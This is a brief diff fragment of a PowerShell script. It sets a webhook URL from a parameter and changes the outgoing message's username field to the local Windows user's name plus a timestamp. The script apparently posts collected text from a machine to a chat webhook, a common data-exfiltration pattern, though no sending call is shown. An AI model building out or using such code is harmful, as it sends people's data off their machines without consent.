@@ -77,7 +77,7 @@ param (
 $hookurl = "$dc"
 
 $Body = @{
-  'username' = $FolderName
+  'username' = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)"
   'content' = $text
 }
 
